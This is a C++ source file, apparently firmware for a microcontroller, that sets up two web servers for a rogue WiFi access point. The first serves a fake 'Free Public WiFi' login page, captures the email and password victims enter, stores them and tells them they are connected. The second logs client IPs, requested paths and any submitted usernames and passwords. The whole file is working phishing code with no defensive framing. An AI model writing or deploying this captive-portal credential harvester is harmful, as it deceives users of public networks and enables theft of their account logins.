#include "web_servers.h"

// MITM Server setup and handlers
void setupMitmServer() {
  mitmServer.on("/", []() {
    String html = "<html><head><title>Login Required</title></head>";
    html += "<body><h1>Free Public WiFi</h1>";
    html += "<p>Please login to access the internet</p>";
    html += "<form method='post' action='/login'>";
    html += "Email: <input type='text' name='email'><br>";
    html += "Password: <input type='password' name='password'><br>";
    html += "<input type='submit' value='Login'>";
    html += "</form></body></html>";
    
    mitmServer.send(200, "text/html", html);
  });
  
  mitmServer.on("/login", []() {
    String email = mitmServer.arg("email");
    String password = mitmServer.arg("password");
    
    // Log the credentials
    String log = "Cred: " + email + ":" + password;
    mitmCredentials.push_back(log);
    if (mitmCredentials.size() > 10) {
      mitmCredentials.erase(mitmCredentials.begin());
    }
    
    // Show a success page
    String html = "<html><head><title>Login Successful</title></head>";
    html += "<body><h1>Login Successful</h1>";
    html += "<p>You are now connected to the internet</p>";
    html += "</body></html>";
    
    mitmServer.send(200, "text/html", html);
  });
  
  mitmServer.onNotFound([]() {
    mitmServer.send(200, "text/html", "<html><body><h1>Free Public WiFi</h1><p>Redirecting to login page...</p></body></html>");
  });
  
  mitmServer.begin();
}

// AP Server setup and handlers
void setupApServer() {
  apServer.on("/", []() {
    String html = "<html><head><title>Welcome</title></head>";
    html += "<body><h1>Welcome to Weak WiFi</h1>";
    html += "<p>This is an open WiFi network</p>";
    html += "</body></html>";
    
    apServer.send(200, "text/html", html);
    
    // Log the access
    String clientIP = apServer.client().remoteIP().toString();
    String log = "HTTP from " + clientIP;
    apLogs.push_back(log);
    if (apLogs.size() > 20) {
      apLogs.erase(apLogs.begin());
    }
  });
  
  apServer.on("/login", []() {
    // Simulate a login attempt
    String username = apServer.arg("username");
    String password = apServer.arg("password");
    
    if (username.length() > 0 && password.length() > 0) {
      String log = "Login: " + username + ":" + password;
      apLogs.push_back(log);
      if (apLogs.size() > 20) {
        apLogs.erase(apLogs.begin());
      }
    }
    
    apServer.send(200, "text/plain", "Login attempted");
  });
  
  apServer.onNotFound([]() {
    String uri = apServer.uri();
    String log = "404: " + uri;
    apLogs.push_back(log);
    if (apLogs.size() > 20) {
      apLogs.erase(apLogs.begin());
    }
    
    apServer.send(404, "text/plain", "Not found");
  });
  
  apServer.begin();
}
